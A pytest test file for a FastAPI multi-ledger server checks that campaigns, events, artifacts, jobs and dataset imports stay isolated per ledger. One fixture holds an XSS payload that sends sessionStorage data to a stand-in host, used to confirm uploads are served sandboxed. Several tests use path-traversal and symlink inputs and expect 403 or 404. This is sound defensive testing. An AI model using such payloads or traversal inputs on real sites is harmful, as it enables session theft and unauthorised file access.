"""One server process, several ledgers: isolated lists, events, artifacts, jobs and datasets; an unknown ledger is a
404 that leaves nothing behind. Offline only: the campaigners are fakes and no provider is called."""
import json
import os
import shutil
import threading
import time
from pathlib import Path

import cv2
import numpy as np
import pytest
from fastapi.testclient import TestClient
from pydantic import TypeAdapter

from translucent import replay, runtime, server
from translucent.contracts import Campaign, Source
from translucent.ledger import Ledger
from translucent.loop_contracts import CampaignSummary
from translucent.workspace import init_ledger

DATA = Path(__file__).parent / "data" / "import_v2"
TEAM = {"Authorization": "Bearer team-secret"}
ADMIN = {"Authorization": "Bearer test-administrator"}
SUMMARY = TypeAdapter(CampaignSummary)


@pytest.fixture(autouse=True)
def no_live_models(monkeypatch):
    def denied(*args, **kwargs):
        raise AssertionError("Paid model calls are forbidden in API tests")
    monkeypatch.setattr(runtime, "_client", denied)
    for name in ("TRANSLUCENT_LIVE", "TRANSLUCENT_ADMIN_TOKEN", "TRANSLUCENT_CORS_ORIGINS", "TRANSLUCENT_IMPORT_ROOT",
                 "TRANSLUCENT_DATA_ROOT"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("TRANSLUCENT_TEAM_TOKEN", "team-secret")


def enable_live(monkeypatch):
    monkeypatch.setenv("TRANSLUCENT_LIVE", "1")
    monkeypatch.setenv("TRANSLUCENT_ADMIN_TOKEN", "test-administrator")
    for name in ("FIREWORKS_API_KEY", "MODEL_API_KEY"):  # placeholders: the fake campaigners never call a provider
        monkeypatch.setenv(name, "test-key")


def tiny_video(L, tmp_path, tag):
    path = tmp_path / f"{tag}.mp4"
    writer = cv2.VideoWriter(str(path), cv2.VideoWriter_fourcc(*"mp4v"), 1, (16, 16))
    assert writer.isOpened()
    writer.write(np.full((16, 16, 3), len(tag), dtype=np.uint8))   # different bytes per ledger
    writer.release()
    return L.put_file(path, kind="video", media_type="video/mp4", source=Source(uri="experiment:fixture"))


@pytest.fixture
def root(tmp_path):
    """Two ledgers that share a campaign id ("shared") with different titles and events."""
    root = tmp_path / "data"
    for lid in ("acme", "beta"):
        L = Ledger(init_ledger(root, lid, title=lid.capitalize() + " lab"))
        video = tiny_video(L, tmp_path, lid)
        L.add(Campaign(id="shared", objective=f"{lid} question", title=f"{lid} campaign", inputs=[video.id],
                       budget_usd=1, created_at=1.0))
        L.emit("shared", "campaign.started", "runtime", f"{lid} start")
        if lid == "acme":
            L.emit("shared", "step.started", "runtime", "acme work")
            L.add(Campaign(id="acme-only", objective="Only here", title="Acme only", inputs=[video.id],
                           budget_usd=1, created_at=2.0))
        L.emit("shared", "campaign.finished", "runtime", f"{lid} done", data={"status": "finished"})
        L.db.close()
    return root


def make_app(root, factory=None, **kw):
    return server.create_app(data_root=root, campaigner_factory=factory, poll_interval=0.01, **kw)


def sse(response):
    ids, data = [], []
    for line in response.text.splitlines():
        if line.startswith("id: "):
            ids.append(int(line[4:]))
        elif line.startswith("data: "):
            data.append(json.loads(line[6:]))
    return ids, data


def tree(path):
    return sorted(str(p.relative_to(path)) for p in path.rglob("*"))


def items(client, lid, **params):
    response = client.get(f"/api/v1/ledgers/{lid}/campaigns", params=params)
    assert response.status_code == 200, response.text
    return response.json()


# ------------------------------------------------------------------ 1. two ledgers, isolated lists

def test_two_ledgers_from_one_process_list_only_their_own(root):
    with TestClient(make_app(root)) as client:
        assert client.get("/api/v1/ledgers").json() == [
            {"id": "acme", "title": "Acme lab", "campaigns": 2, "datasets": 0},
            {"id": "beta", "title": "Beta lab", "campaigns": 1, "datasets": 0}]
        acme, beta = items(client, "acme"), items(client, "beta")
        assert [c["id"] for c in acme["items"]] == ["acme-only", "shared"] and acme["next_cursor"] is None
        assert [(c["id"], c["title"], c["ledger"]) for c in beta["items"]] == [("shared", "beta campaign", "beta")]
        shared = acme["items"][1]
        assert shared["title"] == "acme campaign" and shared["objective"] == "acme question"
        assert shared["kind"] == "video" and shared["status"] == "finished" and shared["next_action"] == "none"
        for item in acme["items"] + beta["items"]:
            SUMMARY.validate_python(item)      # exactly the web contract's fields and values
        # pages: newest first, and the cursor is stable
        first = items(client, "acme", limit=1)
        assert [c["id"] for c in first["items"]] == ["acme-only"] and first["next_cursor"] is not None
        rest = items(client, "acme", limit=1, cursor=first["next_cursor"])
        assert [c["id"] for c in rest["items"]] == ["shared"] and rest["next_cursor"] is None
        assert client.get("/api/v1/ledgers/acme/campaigns", params={"limit": 0}).status_code == 422
        # legacy routes serve the ledger "default", which this data root does not have
        assert client.get("/api/campaigns").status_code == 404
        assert client.get("/api/session").status_code == 200


def test_campaign_list_covers_every_kind(root, monkeypatch):
    from support.loop_systems import PREDICTION, objective, register
    from translucent.loop_service import Actor, LoopService
    register(monkeypatch)
    L = Ledger(root / "ledgers" / "acme")
    try:
        cid = LoopService(L, Actor("person", "Ana", "http")).open_campaign(objective(), "Faster charge")["campaign_id"]
        LoopService(L, Actor("agent", "muse-test", "planner")).propose(
            cid, "simulate_charge", {"current_A": 2.0, "ambient_C": 25.0}, rationale="Faster.",
            prediction=PREDICTION, expected_effect="Try higher next.")
        L.add(Campaign(id="nist", objective="Which intervention?", title="NIST", inputs=[], budget_usd=1,
                       created_at=3.0))
        L.db.execute("INSERT INTO record VALUES (?,?,?,?,?,?)",   # just enough of an intervention protocol to classify
                     ("iv_protocol", "intervention", "nist", None, json.dumps({"type": "protocol"}), 3.0))
        L.emit("nist", "campaign.started", "intervention", "Start")
        for usd in (0.25, 0.125):
            L.emit("shared", "cost.updated", "runtime", "Spending updated", data={"usd": usd})
    finally:
        L.db.close()
    with TestClient(make_app(root)) as client:
        listed = {c["id"]: c for c in items(client, "acme")["items"]}
        for item in listed.values():
            SUMMARY.validate_python(item)
        loop = listed[cid]
        assert (loop["kind"], loop["status"], loop["next_action"], loop["outcome"]) == (
            "loop", "waiting_for_approval", "awaiting_approval", None)
        assert loop["objective"] == objective()["statement"][:140]
        assert (listed["nist"]["kind"], listed["nist"]["status"]) == ("intervention", "running")
        assert listed["shared"]["spend_usd"] == 0.375 and listed["shared"]["updated_at"] > 1.0
        assert [c["kind"] for c in items(client, "beta")["items"]] == ["video"]


# ------------------------------------------------------------------ 2. unknown ledger: 404, nothing created

@pytest.mark.parametrize("lid", ["nope", "con", "a", "ACME", "-x", "..", "%2e%2e", "acme..", "acme%5c..%5cbeta"])
def test_unknown_ledger_is_404_and_creates_nothing(root, monkeypatch, lid):
    enable_live(monkeypatch)
    app = make_app(root, import_root=root.parent)
    with TestClient(app) as client:
        assert app.state.export_ready.wait(30)     # the export cache is written by then
        before = tree(root)
        base = f"/api/v1/ledgers/{lid}"
        calls = [client.get(base + "/campaigns"), client.get(base + "/campaigns/shared/events"),
                 client.get(base + "/artifacts/sha256:" + "0" * 64),
                 client.put(base + "/uploads/" + "a" * 32 + "/x.csv", content=b"t,y\n", headers=TEAM),
                 client.post(base + "/datasets", json={"manifest": {}, "path": "."}, headers=TEAM),
                 client.post(base + "/video-campaigns", headers=ADMIN, json={
                     "objective": "x", "experiment_id": "fixture", "profile": "dev", "budget": 0.25})]
        assert [r.status_code for r in calls] == [404] * len(calls), [r.text for r in calls]
        # inside the known ledgers' folders the server's own runner and planner threads write as they please
        outside = lambda t: [p for p in t if Path(p).parts[:2] not in {(d, k) for d in ("ledgers", "state")
                                                                         for k in ("acme", "beta")}]
        assert outside(tree(root)) == outside(before)
    # (not Path.exists: Windows folds case and drops trailing dots, so "ACME" and "acme.." would find acme)
    assert sorted(p.name for p in (root / "ledgers").iterdir()) == ["acme", "beta"]
    assert sorted(p.name for p in (root / "state").iterdir()) == ["acme", "beta", "server.lock"]


def test_writes_need_the_same_tokens_as_legacy_writes(root, monkeypatch):
    with TestClient(make_app(root)) as client:
        assert client.put("/api/v1/ledgers/acme/uploads/" + "a" * 32 + "/x.csv", content=b"x").status_code == 403
        assert client.post("/api/v1/ledgers/acme/datasets", json={"manifest": {}, "path": "."}).status_code == 403
        body = {"objective": "x", "experiment_id": "fixture", "profile": "dev", "budget": 0.25}
        assert client.post("/api/v1/ledgers/acme/video-campaigns", json=body, headers=TEAM).status_code == 403
        enable_live(monkeypatch)    # live on, but the team token still cannot start a paid run
        assert client.post("/api/v1/ledgers/acme/video-campaigns", json=body, headers=TEAM).status_code == 403
    assert not (root / "state" / "acme" / "dataset-uploads").exists()


# ------------------------------------------------------------------ 3. one legacy job per ledger

def test_each_ledger_runs_one_legacy_job_and_a_second_in_the_same_ledger_is_409(root, monkeypatch):
    enable_live(monkeypatch)
    entered = {"acme": threading.Event(), "beta": threading.Event()}
    release = threading.Event()

    class Blocking:
        def __init__(self, ledger, campaign, settings):
            self.L, self.c = ledger, campaign

        def run(self):
            entered[self.L.root.name].set()
            assert release.wait(10)
            self.L.emit(self.c.id, "campaign.started", "runtime", "Start")
            self.L.emit(self.c.id, "campaign.finished", "runtime", "Done", data={"status": "finished"})
            return {"status": "finished"}

    body = {"objective": "Find it", "experiment_id": "fixture", "profile": "dev", "budget": 0.25}
    post = lambda client, lid: client.post(f"/api/v1/ledgers/{lid}/video-campaigns", json=body, headers=ADMIN)
    with TestClient(make_app(root, Blocking)) as client:
        try:
            first = {lid: post(client, lid) for lid in ("acme", "beta")}
            assert {lid: r.status_code for lid, r in first.items()} == {"acme": 202, "beta": 202}
            assert entered["acme"].wait(10) and entered["beta"].wait(10)    # both run at the same time
            for lid in ("acme", "beta"):
                again = post(client, lid)
                assert again.status_code == 409 and "already queued, running or paused" in again.json()["detail"]
                listed = {c["id"]: c for c in items(client, lid)["items"]}
                assert listed[first[lid].json()["id"]]["status"] == "running"
        finally:
            release.set()
        deadline = time.monotonic() + 30
        for lid in ("acme", "beta"):
            cid = first[lid].json()["id"]
            while {c["id"]: c for c in items(client, lid)["items"]}[cid]["status"] != "finished":
                assert time.monotonic() < deadline, f"{lid} job did not finish"
                time.sleep(0.02)
            assert first[lid].json()["id"] not in {c["id"] for c in items(client, "beta" if lid == "acme" else "acme")
                                                   ["items"]}
        assert post(client, "acme").status_code == 202      # the slot is free again
    for lid in ("acme", "beta"):
        jobs = [json.loads(p.read_text()) for p in (root / "state" / lid / "jobs").glob("*.json")]
        assert {j["status"] for j in jobs} <= {"finished", "queued", "running", "interrupted"} and jobs


# ------------------------------------------------------------------ 4. events and artifacts per ledger

def test_sse_last_event_id_per_ledger(root):
    with TestClient(make_app(root)) as client:
        ids, data = sse(client.get("/api/v1/ledgers/acme/campaigns/shared/events"))
        assert ids == [1, 2, 3] and [e["title"] for e in data] == ["acme start", "acme work", "acme done"]
        ids, data = sse(client.get("/api/v1/ledgers/beta/campaigns/shared/events"))
        assert ids == [1, 2] and [e["title"] for e in data] == ["beta start", "beta done"]
        resumed = client.get("/api/v1/ledgers/acme/campaigns/shared/events", headers={"Last-Event-ID": "1"})
        assert resumed.headers["content-type"].startswith("text/event-stream") and sse(resumed)[0] == [2, 3]
        ids, data = sse(client.get("/api/v1/ledgers/beta/campaigns/shared/events", headers={"Last-Event-ID": "1"}))
        assert ids == [2] and data[0]["title"] == "beta done"
        assert sse(client.get("/api/v1/ledgers/beta/campaigns/shared/events", headers={"Last-Event-ID": "2"}))[0] == []
        assert client.get("/api/v1/ledgers/beta/campaigns/shared/events",
                          headers={"Last-Event-ID": "abc"}).status_code == 400
        assert client.get("/api/v1/ledgers/beta/campaigns/acme-only/events").status_code == 404


def test_artifacts_are_per_ledger(root):
    L = Ledger(root / "ledgers" / "acme")
    art = L.put_bytes(b"only in acme", kind="text", media_type="text/plain")
    L.db.close()
    with TestClient(make_app(root)) as client:
        got = client.get(f"/api/v1/ledgers/acme/artifacts/{art.id}")
        assert got.content == b"only in acme" and got.headers["x-content-type-options"] == "nosniff"
        assert client.get(f"/api/v1/ledgers/beta/artifacts/{art.id}").status_code == 404
        assert client.get("/api/v1/ledgers/acme/artifacts/..%2F..%2Fledger.sqlite").status_code == 404


def test_artifacts_never_run_as_active_content_on_the_app_origin(root):
    """A person's upload is stored under the type its name suggests; HTML or SVG must download, never render here."""
    L = Ledger(root / "ledgers" / "acme")
    script = b"<script>fetch('https://x.example/?k='+sessionStorage.getItem('k'))</script>"
    arts = {media: L.put_bytes(script + media.encode(), kind="text", media_type=media).id
            for media in ("text/html; charset=utf-8", "image/svg+xml", "application/xhtml+xml", "text/javascript",
                          "application/octet-stream", "text/csv", "application/json", "image/png", "video/mp4")}
    L.db.close()
    with TestClient(make_app(root)) as client:
        for media, aid in arts.items():
            got = client.get(f"/api/v1/ledgers/acme/artifacts/{aid}")
            assert got.status_code == 200 and got.headers["x-content-type-options"] == "nosniff", media
            assert got.headers["content-security-policy"] == "sandbox", media
            inline = media in ("text/csv", "application/json", "image/png", "video/mp4")
            assert ("content-disposition" not in got.headers) == inline, media
            if not inline:
                assert got.headers["content-disposition"] == "attachment", media


# ------------------------------------------------------------------ 5. prewarm exports only campaigns with a video

def test_prewarm_never_exports_a_campaign_without_video_or_intervention_protocol(root, monkeypatch):
    L = Ledger(root / "ledgers" / "beta")
    L.add(Campaign(id="loop_0123456789abcdef", objective="A loop", title="Loop", inputs=[], budget_usd=1,
                   created_at=5.0))
    L.add(Campaign(id="plain", objective="No video", title="Plain", inputs=[], budget_usd=1, created_at=6.0))
    L.db.close()
    calls = []
    monkeypatch.setattr(replay, "export", lambda L, cid, *a, **kw: calls.append((L.original.root.name, cid)) or
                        (_ for _ in ()).throw(RuntimeError("stop here: the call is what this test checks")))
    app = make_app(root)
    with TestClient(app):
        assert app.state.export_ready.wait(30)
    assert sorted(calls) == [("acme", "acme-only"), ("acme", "shared"), ("beta", "shared")]
    assert set(app.state.export_errors) == {"acme/acme-only", "acme/shared", "beta/shared"}


# ------------------------------------------------------------------ 6. datasets through HTTP

def manifest_files(manifest):
    out = set()
    def walk(x):
        if isinstance(x, dict):
            for k, v in x.items():
                if k == "file" and isinstance(v, str):
                    out.add(v)
                walk(v)
        elif isinstance(x, list):
            for v in x:
                walk(v)
    walk(manifest)
    return sorted(out)


@pytest.fixture
def imports(tmp_path):
    folder = tmp_path / "imports"
    shutil.copytree(DATA, folder / "bench")
    return folder, json.loads((DATA / "manifest.json").read_text(encoding="utf-8"))


def test_the_same_dataset_id_imports_into_two_ledgers(root, imports):
    folder, manifest = imports
    uid = "ab" * 16
    with TestClient(make_app(root, import_root=folder)) as client:
        for name in manifest_files(manifest):     # acme: uploaded files
            put = client.put(f"/api/v1/ledgers/acme/uploads/{uid}/{name}", content=(DATA / name).read_bytes(),
                             headers=TEAM)
            assert put.status_code == 201, put.text
        made = client.post("/api/v1/ledgers/acme/datasets", json={"manifest": manifest, "upload_id": uid},
                           headers={**TEAM, "Idempotency-Key": "first-import"})
        assert made.status_code == 201, made.text
        assert made.json()["id"] == manifest["id"] and made.json()["records"][0]["specimen"]["id"] == "cell-0007"
        assert not (root / "state" / "acme" / "dataset-uploads" / uid).exists()      # staging removed
        replay_ = client.post("/api/v1/ledgers/acme/datasets", json={"manifest": manifest, "upload_id": uid},
                              headers={**TEAM, "Idempotency-Key": "first-import"})
        assert replay_.status_code == 201 and replay_.json() == made.json()          # answered once, per ledger
        # beta: the same id, read from the server's import folder
        other = client.post("/api/v1/ledgers/beta/datasets", json={"manifest": manifest, "path": "bench"},
                            headers=TEAM)
        assert other.status_code == 201, other.text
        assert other.json()["id"] == made.json()["id"]
        again = client.post("/api/v1/ledgers/acme/datasets", json={"manifest": manifest, "path": "bench"},
                            headers=TEAM)
        assert again.status_code == 201 and again.json() == made.json()             # the same dataset: stored one
        changed = client.post("/api/v1/ledgers/acme/datasets", headers=TEAM,
                              json={"manifest": {**manifest, "title": "Another screen"}, "path": "bench"})
        assert changed.status_code == 409 and "already has this id in this ledger" in changed.json()["detail"]
        broken = client.post("/api/v1/ledgers/beta/datasets", headers=TEAM,
                             json={"manifest": {**manifest, "id": "other", "records": []}, "path": "bench"})
        assert broken.status_code == 422 and isinstance(broken.json()["detail"], str)
        assert "Value error" not in broken.json()["detail"]
        missing = client.post("/api/v1/ledgers/beta/datasets", headers=TEAM,
                              json={"manifest": manifest, "upload_id": "cd" * 16})
        assert missing.status_code == 404
        assert [(x["id"], x["datasets"]) for x in client.get("/api/v1/ledgers").json()] == [("acme", 1), ("beta", 1)]
    with _open(root, "beta") as L:
        assert [d.id for d in L.list("dataset")] == [manifest["id"]]


class _open:
    def __init__(self, root, lid):
        self.L = Ledger(root / "ledgers" / lid)

    def __enter__(self):
        return self.L

    def __exit__(self, *exc):
        self.L.db.close()


def _link(link, target):
    try:
        os.symlink(target, link, target_is_directory=Path(target).is_dir())
    except OSError:
        pytest.skip("creating symlinks needs a privilege this account lacks")


@pytest.mark.parametrize("where", ["absolute", "dotdot", "missing", "linked-folder", "linked-file", "no-root"])
def test_a_path_import_stays_inside_the_import_root(root, imports, tmp_path, where):
    folder, manifest = imports
    outside = tmp_path / "secret"
    shutil.copytree(DATA, outside)
    path = {"absolute": str(outside), "dotdot": "../secret", "missing": "nowhere", "linked-folder": "link",
            "linked-file": "bench", "no-root": "bench"}[where]
    if where == "linked-folder":
        _link(folder / "link", outside)
    if where == "linked-file":
        (folder / "bench" / "eclab-cell07.mpt").unlink()
        _link(folder / "bench" / "eclab-cell07.mpt", outside / "eclab-cell07.mpt")
    app = make_app(root, import_root=None if where == "no-root" else folder)
    with TestClient(app) as client:
        r = client.post("/api/v1/ledgers/acme/datasets", json={"manifest": manifest, "path": path}, headers=TEAM)
        assert r.status_code == 403, r.text
        assert {"absolute": "not a file in the import folder", "dotdot": "not a file in the import folder",
                "missing": "not a file in the import folder", "linked-folder": "links are not followed",
                "linked-file": "links are not followed", "no-root": "no import folder"}[where] in r.json()["detail"]
        assert client.get("/api/v1/ledgers").json()[0]["datasets"] == 0
